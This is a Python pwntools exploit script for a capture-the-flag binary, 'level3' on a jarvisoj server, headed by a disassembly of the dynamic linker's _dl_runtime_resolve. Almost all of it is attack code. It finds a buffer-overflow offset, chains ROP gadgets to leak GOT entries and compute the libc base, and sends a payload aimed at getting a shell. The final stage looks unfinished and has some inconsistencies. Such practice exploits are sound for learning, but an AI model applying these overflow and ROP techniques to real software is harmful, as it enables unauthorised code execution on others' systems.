#encoding:utf-8

"""
remote ld.so: _dl_runtime_resolve => 
   0:   53                      push   rbx
   1:   48 89 e3                mov    rbx,rsp
   4:   48 83 e4 c0             and    rsp,0xffffffffffffffc0
   8:   48 2b 25 61 de 20 00    sub    rsp,QWORD PTR [rip+0x20de61]        # 0x20de70
   f:   48 89 04 24             mov    QWORD PTR [rsp],rax
  13:   48 89 4c 24 08          mov    QWORD PTR [rsp+0x8],rcx
  18:   48 89 54 24 10          mov    QWORD PTR [rsp+0x10],rdx
  1d:   48 89 74 24 18          mov    QWORD PTR [rsp+0x18],rsi
  22:   48 89 7c 24 20          mov    QWORD PTR [rsp+0x20],rdi
  27:   4c 89 44 24 28          mov    QWORD PTR [rsp+0x28],r8
  2c:   4c 89 4c 24 30          mov    QWORD PTR [rsp+0x30],r9
  31:   b8 ee 00 00 00          mov    eax,0xee
  36:   31 d2                   xor    edx,edx
  38:   48 89 94 24 50 02 00    mov    QWORD PTR [rsp+0x250],rdx
  3f:   00 
  40:   48 89 94 24 58 02 00    mov    QWORD PTR [rsp+0x258],rdx
  47:   00 
  48:   48 89 94 24 60 02 00    mov    QWORD PTR [rsp+0x260],rdx
  4f:   00 
  50:   48 89 94 24 68 02 00    mov    QWORD PTR [rsp+0x268],rdx
  57:   00 
  58:   48 89 94 24 70 02 00    mov    QWORD PTR [rsp+0x270],rdx
  5f:   00 
  60:   48 89 94 24 78 02 00    mov    QWORD PTR [rsp+0x278],rdx
  67:   00 
  68:   0f c7 64 24 40          xsavec [rsp+0x40]
  6d:   48 8b 73 10             mov    rsi,QWORD PTR [rbx+0x10]
  71:   48 8b 7b 08             mov    rdi,QWORD PTR [rbx+0x8]
  75:   e8 a6 7a ff ff          call   0xffffffffffff7b20
  7a:   49 89 c3                mov    r11,rax
  7d:   b8 ee 00 00 00          mov    eax,0xee
  82:   31 d2                   xor    edx,edx
  84:   0f ae 6c 24 40          xrstor [rsp+0x40]
  89:   4c 8b 4c 24 30          mov    r9,QWORD PTR [rsp+0x30]
  8e:   4c 8b 44 24 28          mov    r8,QWORD PTR [rsp+0x28]
  93:   48 8b 7c 24 20          mov    rdi,QWORD PTR [rsp+0x20]
  98:   48 8b 74 24 18          mov    rsi,QWORD PTR [rsp+0x18]
  9d:   48 8b 54 24 10          mov    rdx,QWORD PTR [rsp+0x10]
  a2:   48 8b 4c 24 08          mov    rcx,QWORD PTR [rsp+0x8]
  a7:   48 8b 04 24             mov    rax,QWORD PTR [rsp]
  ab:   48 89 dc                mov    rsp,rbx
  ae:   48 8b 1c 24             mov    rbx,QWORD PTR [rsp]
  b2:   48 83 c4 18             add    rsp,0x18
  b6:   f2 41 ff e3             bnd jmp r11
"""


from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'


class Pwn(object):

    def __init__(self, binary_file=None, remote=None, sign=True):
        if binary_file:
            self.binary_file = binary_file
            self.elf = ELF(self.binary_file)
            self.local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
   
        if remote:
            self.host = remote['host']
            self.port = remote['port']
            self.remote_libc = './libc-2.19.so'
        self.remote_sign = sign
        if self.remote_sign:
            print 'use remote libc'
            self.libc = ELF(self.remote_libc)
        else:
            self.libc = ELF(self.local_libc)


    def get_overflow_position(self):
        # must use local binary
        if self.binary_file:
            io = process(self.binary_file)
            io.recvline()
            io.send(cyclic(600))
            io.recvall()

            if os.path.isfile('./core'):
                core = Core('./core')
                self.rip = cyclic_find(core.u32(core.rsp))
                print 'rip:', hex(self.rip)


    def get_io(self, remote_sign=False):
        io = None
        if remote_sign:
            io = remote(self.host, self.port)
        else:
            io = process(self.binary_file)
        return io


    def _call_rop(self, func_got, arg1, arg2, arg3, ret_func):
        payload = 'a' * self.rip 
        payload += p64(self.pop_multi_addr) + p64(0) + p64(1) 
        payload += p64(func_got)
        payload += p64(arg3) + p64(arg2) + p64(arg1)
        payload += p64(self.ret_addr)
        payload += 'a' * 56
        payload += p64(ret_func)
        self.io.send(payload)

    
    def get_shell(self):
        """
         void *mmap(void *addr, size_t length, int prot, int flags,
                           int fd, off_t offset);
        """
        self.io = self.get_io()
        # gdb.attach(self.io, 'b main')
        gdb.attach(self.io, 'b vulnerable_function')
        self.io.recvuntil("Input:\n")

        write_plt = self.elf.symbols['write']
        read_plt = self.elf.symbols['read']
        write_got = self.elf.got['write']
        read_got = self.elf.got['read']
        dl_runtime_resolve_addr = 0x600A50

        self.pop_multi_addr = 0x4006AA
        self.ret_addr = 0x400690

        print 'getting write_got address...'
        self._call_rop(func_got=write_got, 
                       arg1=1,
                       arg2=write_got,
                       arg3=8,
                       ret_func=self.elf.symbols['main'])
        write_got_plt = self.io.unpack()
        self.io.recvuntil("Input:\n")
        print "write_got_plt:", hex(write_got_plt)
        
        # get libc address
        self.libc.address = write_got_plt - self.libc.symbols['write']
        print 'libc.addres:', hex(self.libc.address)

        print 'getting dl_runtime_resolve address'
        self._call_rop(func_got=write_got, 
                       arg1=1,
                       arg2=dl_runtime_resolve_addr,
                       arg3=8,
                       ret_func=self.elf.symbols['main'])
        dl_runtime_resolve_addr_true = self.io.unpack()
        print 'dl_runtime_resolve_addr:', hex(dl_runtime_resolve_addr_true)
        pop_rax_ret_addr = self.libc.address + 0x33544
        print 'pop_rax_ret_addr:', hex(pop_rax_ret_addr)

        self.io.recvuntil("Input:\n")

        # print 'get dl_runtime_resolve function...'
        # self._call_rop(func_got=write_got, 
                       # arg1=1,
                       # arg2=dl_runtime_resolve_addr_true,
                       # arg3=200,
                       # ret_func=self.elf.symbols['main'])
        # dl_runtime_function = self.io.recvn(200)
        # self.io.recvuntil("Input:\n")
        # print disasm(dl_runtime_function)
        # print '=' * 80
        # print "write_got_plt:", hex(write_got_plt)

        pop_rax_ret_addr = self.libc.address + 0x33544
        print 'pop_rax_ret_addr:', hex(pop_rax_ret_addr)
        gadgets_addr = dl_runtime_resolve_addr_true + 0x7a
        print 'godgets_addr:', hex(gadgets_addr)
        payload = 'a' * self.rip + p64(pop_rax_ret_addr) + p64(self.elf.symbols['main'])
        payload += p64(gadgets_addr)
        self.io.send(payload)


def main():
    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level3', sign=False)
    # pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9884}, binary_file='./level3', sign=True)
    pwn.get_overflow_position()
    pwn.get_shell()


if __name__ == "__main__":
    main()

